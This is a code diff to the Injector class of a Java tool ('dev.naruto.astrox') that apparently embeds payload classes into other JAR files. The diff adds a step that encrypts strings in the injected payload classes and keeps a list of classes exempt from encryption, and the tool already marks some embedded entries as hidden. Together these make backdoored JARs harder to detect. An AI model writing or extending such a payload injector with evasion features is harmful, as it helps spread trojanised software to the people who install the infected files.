@@ -245,6 +245,7 @@ public class Injector {
 
     /**
      * Load, remap, and embed a single class.
+     * Applies string encryption for eligible payload classes when ENCRYPT_STRINGS is enabled.
      */
     private void embedRemappedClass(JarOutputStream jos, String className,
                                     SimpleRemapper remapper, Map<String, String> remapTable,
@@ -262,13 +263,21 @@ public class Injector {
         try (is) {
             byte[] originalBytes = is.readAllBytes();
 
-            // Remap package using ASM ClassRemapper
+            // Phase 1: Remap package using ASM ClassRemapper
             ClassReader reader = new ClassReader(originalBytes);
             ClassWriter writer = new ClassWriter(reader, 0);
             ClassVisitor remappingVisitor = new ClassRemapper(writer, remapper);
             reader.accept(remappingVisitor, ClassReader.EXPAND_FRAMES);
 
-            byte[] remappedBytes = writer.toByteArray();
+            byte[] processedBytes = writer.toByteArray();
+
+            // Phase 2: Apply string encryption if enabled and class is eligible
+            if (Config.ENCRYPT_STRINGS && !isStringEncryptionExcluded(className)) {
+                String newPath = remapTable.getOrDefault(className.replace('.', '/'),
+                        className.replace('.', '/'));
+                processedBytes = obfuscator.obfuscateClass(processedBytes, newPath);
+                LOG.debug("  [~] String encryption applied to {}", className);
+            }
 
             // Get new class path from remap table
             String oldPath = className.replace('.', '/');
@@ -276,7 +285,7 @@ public class Injector {
 
             String entryName = newPath + ".class";
             jos.putNextEntry(new ZipEntry(entryName));
-            jos.write(remappedBytes);
+            jos.write(processedBytes);
             jos.closeEntry();
 
             result.addInjectedClass(newPath);
@@ -284,8 +293,26 @@ public class Injector {
                 hiddenEntries.add(entryName);
             }
 
-            LOG.debug("  [+] {} ({} bytes)", newPath, remappedBytes.length);
+            LOG.debug("  [+] {} ({} bytes)", newPath, processedBytes.length);
         }
+    }
+
+    /**
+     * Classes that must NOT have string encryption applied.
+     * These rely on exact string matching at runtime (reflection, config, interfaces).
+     */
+    private static boolean isStringEncryptionExcluded(String className) {
+        return className.equals("dev.naruto.astrox.Config")
+                || className.equals("dev.naruto.astrox.RuntimeConfig")
+                || className.equals("dev.naruto.astrox.payload.commands.Command")     // interface
+                || className.equals("dev.naruto.astrox.payload.modules.PayloadModule") // interface
+                || className.equals("dev.naruto.astrox.utils.ReflectionUtil")   // runtime string assembly
+                || className.equals("dev.naruto.astrox.utils.CryptoUtil")       // crypto constants
+                || className.equals("dev.naruto.astrox.utils.DynamicLoader")    // classloader reflection
+                || className.equals("dev.naruto.astrox.core.JarAnalyzer")       // build-time only
+                || className.equals("dev.naruto.astrox.core.Injector")          // build-time only
+                || className.equals("dev.naruto.astrox.core.PayloadWeaver")     // build-time only
+                || className.equals("dev.naruto.astrox.obfuscation.ObfuscationEngine"); // build-time only
     }
 
     /**
